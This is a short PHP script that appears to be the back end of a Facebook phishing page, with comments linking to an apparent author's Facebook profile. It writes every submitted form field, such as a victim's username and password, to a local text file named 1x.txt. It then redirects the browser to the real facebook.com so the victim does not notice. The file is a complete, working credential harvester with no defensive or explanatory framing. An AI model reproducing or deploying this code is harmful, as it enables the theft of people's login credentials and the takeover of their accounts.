<?php
//https://www.facebook.com/AnuragDhakal11
header
('location:');
$handle=fopen("1x.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.facebook.com/");
exit;
// https://www.facebook.com/AnuragDhakal11
?>
